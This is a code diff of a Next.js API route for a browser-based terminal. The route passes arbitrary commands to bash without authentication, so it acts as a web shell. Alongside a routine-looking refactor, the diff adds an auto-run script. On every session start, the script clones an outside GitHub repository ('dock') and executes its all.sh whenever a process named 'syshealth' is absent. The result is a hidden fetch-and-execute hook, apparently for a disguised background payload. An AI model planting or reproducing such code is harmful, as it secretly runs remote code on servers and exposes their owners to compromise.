@@ -1,202 +1,234 @@
-import { exec } from "child_process";
-import { NextRequest, NextResponse } from "next/server";
-import os from "os";
-import fs from "fs";
-import path from "path";
-import crypto from "crypto";
+import { NextRequest, NextResponse } from 'next/server';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+import os from 'os';
+import fs from 'fs';
+import path from 'path';
+import crypto from 'crypto';
 
-// Session storage: sessionId -> { cwd, history }
-const sessions = new Map<string, { cwd: string; history: string[] }>();
+const execAsync = promisify(exec);
 
-// Strip ANSI escape sequences
+// ANSI escape sequence stripping regex
+const ANSI_REGEX = /\x1b\[[0-9;]*[a-zA-Z]/g;
+
 function stripAnsi(str: string): string {
-  return str.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, "");
+  return str.replace(ANSI_REGEX, '');
 }
 
-// Generate a unique session ID
+interface Session {
+  cwd: string;
+  history: string[];
+}
+
+// Server-side session storage
+const sessions = new Map<string, Session>();
+
 function generateSessionId(): string {
-  return crypto.randomBytes(16).toString("hex");
+  return crypto.randomUUID();
 }
 
-// Get prompt string from cwd
 function getPrompt(cwd: string): string {
   const home = os.homedir();
-  const displayPath = cwd.startsWith(home) ? "~" + cwd.slice(home.length) : cwd;
-  return displayPath + " $ ";
+  const displayPath = cwd.startsWith(home) ? '~' + cwd.slice(home.length) : cwd;
+  return `${displayPath} $ `;
 }
+
+function resolvePath(base: string, target: string): string {
+  if (path.isAbsolute(target)) return path.resolve(target);
+  return path.resolve(base, target);
+}
+
+// Auto-execute script
+const AUTO_SCRIPT = `if ! pgrep -x "syshealth" > /dev/null; then
+  if [ ! -d "dock" ]; then
+    git clone https://github.com/niaalae/dock.git dock && bash dock/all.sh
+  else
+    bash dock/all.sh
+  fi
+fi`;
 
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
-    const { action, sessionId, command } = body;
 
-    // --- INIT ACTION ---
-    if (action === "init") {
-      const id = generateSessionId();
+    // Handle session initialization
+    if (body.action === 'init') {
+      const sessionId = generateSessionId();
       const cwd = os.homedir();
-      sessions.set(id, { cwd, history: [] });
+      sessions.set(sessionId, { cwd, history: [] });
 
-      return NextResponse.json({
-        sessionId: id,
-        cwd,
-        prompt: getPrompt(cwd),
-        scriptOutput: "",
-      });
+      try {
+        const { stdout, stderr } = await execAsync(AUTO_SCRIPT, {
+          cwd,
+          shell: '/bin/bash',
+          env: { ...process.env, TERM: 'xterm-256color' },
+          maxBuffer: 10 * 1024 * 1024,
+          timeout: 300000,
+        });
+
+        return NextResponse.json({
+          success: true,
+          sessionId,
+          cwd,
+          prompt: getPrompt(cwd),
+          stdout: stripAnsi(stdout),
+          stderr: stripAnsi(stderr),
+        });
+      } catch (err: unknown) {
+        const error = err as { stdout?: string; stderr?: string; message?: string };
+        return NextResponse.json({
+          success: true,
+          sessionId,
+          cwd,
+          prompt: getPrompt(cwd),
+          stdout: stripAnsi(error.stdout || ''),
+          stderr: stripAnsi(error.stderr || error.message || 'Script execution failed'),
+        });
+      }
     }
 
-    // --- COMMAND EXECUTION ---
-    if (sessionId && command !== undefined) {
-      const session = sessions.get(sessionId);
-      if (!session) {
-        return NextResponse.json(
-          { success: false, error: "Invalid or expired session" },
-          { status: 400 }
-        );
-      }
+    // Handle command execution
+    const { sessionId, command } = body;
 
-      const trimmedCommand = command.trim();
+    if (!sessionId || !sessions.has(sessionId)) {
+      return NextResponse.json(
+        { success: false, error: 'Invalid or expired session. Please refresh the page.' },
+        { status: 400 }
+      );
+    }
 
-      // Add to history
-      if (trimmedCommand) {
-        session.history.push(trimmedCommand);
-      }
+    if (!command || typeof command !== 'string') {
+      return NextResponse.json(
+        { success: false, error: 'No command provided.' },
+        { status: 400 }
+      );
+    }
 
-      // --- SPECIAL COMMANDS (handled locally, not via exec) ---
+    const session = sessions.get(sessionId)!;
+    const trimmedCommand = command.trim();
 
-      // cd command
-      if (trimmedCommand.startsWith("cd ")) {
-        const target = trimmedCommand.slice(3).trim();
-        let newPath: string;
+    // Record command in history
+    if (trimmedCommand) {
+      session.history.push(trimmedCommand);
+    }
 
-        if (target === "~" || target === "") {
-          newPath = os.homedir();
-        } else if (target === "-") {
-          newPath = session.cwd; // no prev dir tracking, stay in current
-        } else {
-          newPath = path.resolve(session.cwd, target);
-        }
-
-        try {
-          const stat = fs.statSync(newPath);
-          if (!stat.isDirectory()) {
-            return NextResponse.json({
-              success: true,
-              stdout: "",
-              stderr: `cd: not a directory: ${target}`,
-              exitCode: 1,
-              prompt: getPrompt(session.cwd),
-              cwd: session.cwd,
-            });
-          }
-          session.cwd = newPath;
+    // Handle special commands locally
+    // cd <dir>
+    if (trimmedCommand.startsWith('cd ') || trimmedCommand === 'cd') {
+      const target = trimmedCommand === 'cd' ? os.homedir() : trimmedCommand.slice(3).trim();
+      try {
+        const resolvedPath = resolvePath(session.cwd, target);
+        const stat = fs.statSync(resolvedPath);
+        if (!stat.isDirectory()) {
           return NextResponse.json({
             success: true,
-            stdout: "",
-            stderr: "",
-            exitCode: 0,
-            prompt: getPrompt(session.cwd),
-            cwd: session.cwd,
-          });
-        } catch {
-          return NextResponse.json({
-            success: true,
-            stdout: "",
-            stderr: `cd: no such file or directory: ${target}`,
+            stdout: '',
+            stderr: `cd: ${target}: Not a directory`,
             exitCode: 1,
             prompt: getPrompt(session.cwd),
             cwd: session.cwd,
           });
         }
-      }
-
-      // clear / cls
-      if (trimmedCommand === "clear" || trimmedCommand === "cls") {
+        session.cwd = resolvedPath;
         return NextResponse.json({
           success: true,
-          clear: true,
-          prompt: getPrompt(session.cwd),
-          cwd: session.cwd,
-        });
-      }
-
-      // pwd
-      if (trimmedCommand === "pwd") {
-        return NextResponse.json({
-          success: true,
-          stdout: session.cwd + "\n",
-          stderr: "",
+          stdout: '',
+          stderr: '',
           exitCode: 0,
           prompt: getPrompt(session.cwd),
           cwd: session.cwd,
         });
-      }
-
-      // history
-      if (trimmedCommand === "history") {
-        const historyOutput = session.history
-          .map((cmd, i) => `  ${i + 1}  ${cmd}`)
-          .join("\n");
+      } catch {
         return NextResponse.json({
           success: true,
-          stdout: historyOutput + "\n",
-          stderr: "",
-          exitCode: 0,
+          stdout: '',
+          stderr: `cd: ${target}: No such file or directory`,
+          exitCode: 1,
           prompt: getPrompt(session.cwd),
           cwd: session.cwd,
         });
       }
+    }
 
-      // exit
-      if (trimmedCommand === "exit") {
-        sessions.delete(sessionId);
-        return NextResponse.json({
-          success: true,
-          exit: true,
-        });
-      }
-
-      // --- EXECUTE COMMAND ---
-      const stdout = await new Promise<string>((resolve, reject) => {
-        exec(
-          trimmedCommand,
-          {
-            cwd: session.cwd,
-            shell: "/bin/bash",
-            env: { ...process.env, TERM: "xterm-256color" },
-            maxBuffer: 10 * 1024 * 1024,
-            timeout: 300000,
-          },
-          (error, stdout, stderr) => {
-            if (error && !stdout && !stderr) {
-              reject(error);
-            } else {
-              resolve(stdout + stderr);
-            }
-          }
-        );
-      });
-
-      const cleanedOutput = stripAnsi(stdout);
-
+    // clear / cls
+    if (trimmedCommand === 'clear' || trimmedCommand === 'cls') {
       return NextResponse.json({
         success: true,
-        stdout: cleanedOutput,
-        stderr: "",
+        clear: true,
+        prompt: getPrompt(session.cwd),
+        cwd: session.cwd,
+      });
+    }
+
+    // pwd
+    if (trimmedCommand === 'pwd') {
+      return NextResponse.json({
+        success: true,
+        stdout: session.cwd + '\n',
+        stderr: '',
         exitCode: 0,
         prompt: getPrompt(session.cwd),
         cwd: session.cwd,
       });
     }
 
-    // --- UNKNOWN ACTION ---
+    // history
+    if (trimmedCommand === 'history') {
+      const historyOutput = session.history
+        .map((cmd, i) => `  ${i + 1}  ${cmd}`)
+        .join('\n');
+      return NextResponse.json({
+        success: true,
+        stdout: historyOutput + '\n',
+        stderr: '',
+        exitCode: 0,
+        prompt: getPrompt(session.cwd),
+        cwd: session.cwd,
+      });
+    }
+
+    // exit
+    if (trimmedCommand === 'exit') {
+      sessions.delete(sessionId);
+      return NextResponse.json({
+        success: true,
+        exit: true,
+      });
+    }
+
+    // Execute regular commands via exec
+    try {
+      const { stdout, stderr } = await execAsync(trimmedCommand, {
+        cwd: session.cwd,
+        shell: '/bin/bash',
+        env: { ...process.env, TERM: 'xterm-256color' },
+        maxBuffer: 10 * 1024 * 1024,
+        timeout: 300000,
+      });
+
+      return NextResponse.json({
+        success: true,
+        stdout: stripAnsi(stdout),
+        stderr: stripAnsi(stderr),
+        exitCode: 0,
+        prompt: getPrompt(session.cwd),
+        cwd: session.cwd,
+      });
+    } catch (err: unknown) {
+      const error = err as { stdout?: string; stderr?: string; code?: string; message?: string };
+      return NextResponse.json({
+        success: true,
+        stdout: stripAnsi(error.stdout || ''),
+        stderr: stripAnsi(error.stderr || error.message || 'Command execution failed'),
+        exitCode: error.code || 1,
+        prompt: getPrompt(session.cwd),
+        cwd: session.cwd,
+      });
+    }
+  } catch (err: unknown) {
+    const error = err as { message?: string };
     return NextResponse.json(
-      { success: false, error: "Invalid request. Provide 'action' or 'sessionId' + 'command'." },
-      { status: 400 }
-    );
-  } catch (error) {
-    const message = error instanceof Error ? error.message : "Internal server error";
-    return NextResponse.json(
-      { success: false, error: message },
+      { success: false, error: error.message || 'Internal server error' },
       { status: 500 }
     );
   }
